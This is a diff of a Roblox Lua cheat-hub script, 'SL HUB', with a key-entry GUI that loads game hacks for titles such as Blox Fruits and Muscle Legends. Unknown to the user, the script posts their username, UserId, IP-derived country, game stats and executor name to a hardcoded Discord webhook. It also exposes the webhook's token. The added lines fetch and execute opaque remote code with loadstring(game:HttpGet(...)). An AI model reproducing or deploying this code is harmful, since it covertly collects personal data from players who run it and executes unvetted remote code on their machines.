@@ -1,106 +1,91 @@
-    local HttpService = game:GetService("HttpService")
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
 local LocalizationService = game:GetService("LocalizationService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
 
 local player = Players.LocalPlayer
 local webhook = "https://discord.com/api/webhooks/1479815655355187229/JrRe1aeWZp9WOw4t6Qk9DhCPfebK1S7nIcRcf3gy1jVs3Jhc5lRdCw4UK6YPCZixAEf9"
 
 local request = syn and syn.request or http_request or request or fluxus and fluxus.request
 
-local startTime = os.date("%Y-%m-%d %H:%M:%S")
-
 local country = "Unknown"
 pcall(function()
-    country = LocalizationService:GetCountryRegionForPlayerAsync(player)
+	local data = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
+	if data and data.country then
+		country = data.country
+	end
 end)
 
-local strength = "Unknown"
-local rebirths = "Unknown"
-local gems = "Unknown"
-local steps = "Unknown"
+local strength, rebirths, gems, steps = "Unknown","Unknown","Unknown","Unknown"
 
 pcall(function()
-    local ls = player:FindFirstChild("leaderstats")
-    if ls then
-        if ls:FindFirstChild("Strength") then
-            strength = ls.Strength.Value
-        end
-        if ls:FindFirstChild("Rebirths") then
-            rebirths = ls.Rebirths.Value
-        end
-        if ls:FindFirstChild("Gems") then
-            gems = ls.Gems.Value
-        end
-        if ls:FindFirstChild("Steps") then
-            steps = ls.Steps.Value
-        end
-    end
+	local ls = player:FindFirstChild("leaderstats")
+	if ls then
+		if ls:FindFirstChild("Strength") then strength = ls.Strength.Value end
+		if ls:FindFirstChild("Rebirths") then rebirths = ls.Rebirths.Value end
+		if ls:FindFirstChild("Gems") then gems = ls.Gems.Value end
+		if ls:FindFirstChild("Steps") then steps = ls.Steps.Value end
+	end
 end)
 
 local executor = "Unknown"
 pcall(function()
-    if identifyexecutor then
-        executor = identifyexecutor()
-    end
+	if identifyexecutor then
+		executor = identifyexecutor()
+	end
 end)
 
 local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 
 local data = {
-    ["content"] = "**🚀 SL HUB EXECUTED**",
-    ["embeds"] = {{
-        ["color"] = 65280,
-        ["fields"] = {
-            {["name"] = "👤 Username", ["value"] = player.Name, ["inline"] = true},
-            {["name"] = "🆔 UserId", ["value"] = tostring(player.UserId), ["inline"] = true},
-            {["name"] = "🌍 Country", ["value"] = country, ["inline"] = true},
-            {["name"] = "🎮 Game", ["value"] = gameName, ["inline"] = true},
-            {["name"] = "⏱ Time", ["value"] = startTime, ["inline"] = true},
-            {["name"] = "💪 Strength", ["value"] = tostring(strength), ["inline"] = true},
-            {["name"] = "🔁 Rebirths", ["value"] = tostring(rebirths), ["inline"] = true},
-            {["name"] = "💎 Gems", ["value"] = tostring(gems), ["inline"] = true},
-            {["name"] = "👟 Steps", ["value"] = tostring(steps), ["inline"] = true},
-            {["name"] = "⚙️ Executor", ["value"] = executor, ["inline"] = true}
-        }
-    }}
+	["content"] = "**🚀 SL HUB EXECUTED**",
+	["embeds"] = {{
+		["color"] = 65280,
+		["fields"] = {
+			{["name"] = "👤 Username", ["value"] = player.Name, ["inline"] = true},
+			{["name"] = "🆔 UserId", ["value"] = tostring(player.UserId), ["inline"] = true},
+			{["name"] = "🌍 Country", ["value"] = country, ["inline"] = true},
+			{["name"] = "🎮 Game", ["value"] = gameName, ["inline"] = true},
+			{["name"] = "💪 Strength", ["value"] = tostring(strength), ["inline"] = true},
+			{["name"] = "🔁 Rebirths", ["value"] = tostring(rebirths), ["inline"] = true},
+			{["name"] = "💎 Gems", ["value"] = tostring(gems), ["inline"] = true},
+			{["name"] = "👟 Steps", ["value"] = tostring(steps), ["inline"] = true},
+			{["name"] = "⚙️ Executor", ["value"] = executor, ["inline"] = true}
+		}
+	}}
 }
 
 request({
-    Url = webhook,
-    Method = "POST",
-    Headers = {["Content-Type"] = "application/json"},
-    Body = HttpService:JSONEncode(data)
+	Url = webhook,
+	Method = "POST",
+	Headers = {["Content-Type"] = "application/json"},
+	Body = HttpService:JSONEncode(data)
 })
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
-local LocalPlayer = Players.LocalPlayer
 
 local CORRECT_KEY = "SLONTOP"
 local GET_KEY_LINK = "https://discord.gg/eQ8TgyqUdc"
-
-getgenv().KEY_PASSED = false
 
 local Gui = Instance.new("ScreenGui", game.CoreGui)
 Gui.Name = "SL_RGB_KEY"
 Gui.ResetOnSpawn = false
 
 local Main = Instance.new("Frame", Gui)
-Main.Size = UDim2.new(0, 380, 0, 240)
-Main.Position = UDim2.new(0.5, -190, 0.5, -120)
+Main.Size = UDim2.new(0,380,0,240)
+Main.Position = UDim2.new(0.5,-190,0.5,-120)
 Main.BackgroundColor3 = Color3.fromRGB(15,15,15)
 Main.BorderSizePixel = 0
 Main.Active = true
 Main.Draggable = true
-Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 14)
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0,14)
 
 local Glow = Instance.new("UIStroke", Main)
 Glow.Thickness = 2
 local hue = 0
 RunService.RenderStepped:Connect(function()
 	hue = (hue + 0.002) % 1
-	Glow.Color = Color3.fromHSV(hue, 1, 1)
+	Glow.Color = Color3.fromHSV(hue,1,1)
 end)
 
 local Logo = Instance.new("ImageLabel", Main)
@@ -167,16 +152,9 @@ for _,btn in pairs({Verify, GetKey}) do
 	end)
 end
 
-local function Shake()
-	for i = 1,8 do
-		Main.Position += UDim2.new(0, (i%2==0 and -6 or 6),0,0)
-		task.wait(0.02)
-	end
-end
-
 Verify.MouseButton1Click:Connect(function()
 	if Box.Text == CORRECT_KEY then
-		getgenv().KEY_PASSED = true
+
 		for _,v in pairs(Main:GetChildren()) do
 			if v ~= Logo then
 				v:Destroy()
@@ -184,13 +162,12 @@ Verify.MouseButton1Click:Connect(function()
 		end
 
 		local buttonData = {
-			{Text="🍓BLOX FRUITS🍓", Link="https://raw.githubusercontent.com/toxicmahmoudmontaser-dev/SL-HUB-/refs/heads/main/SL%20HUB%20BLOX%20FRUITS%20(1).txt"},
-			{Text="💪Muscle Legends💪", Link="https://raw.githubusercontent.com/toxicmahmoudmontaser-dev/SL-HUB-/refs/heads/main/SL%20HUB%20MUSCLE%20LEGENDS%20.txt"},
-			{Text="⚡Legends Of Speed⚡", Link="https://raw.githubusercontent.com/toxicmahmoudmontaser-dev/SL-HUB-/refs/heads/main/SL%20HUB%20LEGENDS%20OF%20SPEED"},
-			{Text="🌊Escape Tsunami For brainrots🌊", Link="https://raw.githubusercontent.com/toxicmahmoudmontaser-dev/SL-HUB-/refs/heads/main/SL%20HUB%20ESCAPE%20TUSNAMI%20(1).txt"},
-			{Text="⏰Anti AFK⏰", Link="https://raw.githubusercontent.com/toxicmahmoudmontaser-dev/SL-HUB-/refs/heads/main/SL%20HUB%20ANTIAFK%20.txt"}
-		}
-
+	{Text="🍓BLOX FRUITS🍓", Script="loadstring(game:HttpGet('https://vss.pandadevelopment.net/virtual/file/b5980838d263437a'))()"},
+{Text="💪Muscle Legends💪", Script="loadstring(game:HttpGet('https://vss.pandadevelopment.net/virtual/file/60e42553f5e94cc3'))()"},
+{Text="⚡Legends Of Speed⚡", Script="loadstring(game:HttpGet('https://vss.pandadevelopment.net/virtual/file/09afc6d2f223498a'))()"},
+	{Text="🌊Escape Tsunami For brainrots🌊", Script="loadstring(game:HttpGet('https://vss.pandadevelopment.net/virtual/file/242c991bd1df4150'))()"},
+	{Text="⏰Anti AFK⏰", Script="loadstring(game:HttpGet('https://vss.pandadevelopment.net/virtual/file/2d607a2bef7f49f9'))()"}
+}
 		for i, info in ipairs(buttonData) do
 			local btn = Instance.new("TextButton", Main)
 			btn.Size = UDim2.new(0.7,0,0,35)
@@ -204,13 +181,13 @@ Verify.MouseButton1Click:Connect(function()
 
 			btn.MouseButton1Click:Connect(function()
 				Gui:Destroy()
-				loadstring(game:HttpGet(info.Link))()
+				loadstring(info.Script)()
 			end)
 		end
+
 	else
 		Box.Text = ""
 		Box.PlaceholderText = "Wrong key ❌"
-		Shake()
 		task.wait(1)
 		Box.PlaceholderText = "ENTER KEY"
 	end
@@ -221,5 +198,3 @@ GetKey.MouseButton1Click:Connect(function()
 		setclipboard(GET_KEY_LINK)
 	end
 end)
-
-repeat task.wait() until getgenv().KEY_PASSED == true
